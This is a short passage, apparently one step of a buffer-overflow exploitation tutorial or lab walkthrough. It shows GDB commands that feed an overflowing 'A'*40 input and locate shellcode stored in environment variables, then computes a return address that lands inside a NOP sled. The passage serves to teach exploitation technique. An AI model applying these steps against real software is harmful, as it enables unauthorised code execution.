## 8. Find Shellcode Address

In GDB:

```bash
(gdb) b *main+125
(gdb) run $(python -c 'print "A"*40') test
(gdb) x/20s *((char**)environ)
```

Example:

```text
0xbffffeb4
```

Add offset to land inside NOP:

```text
0xbffffeb4 + 50 = 0xbffffee6
```

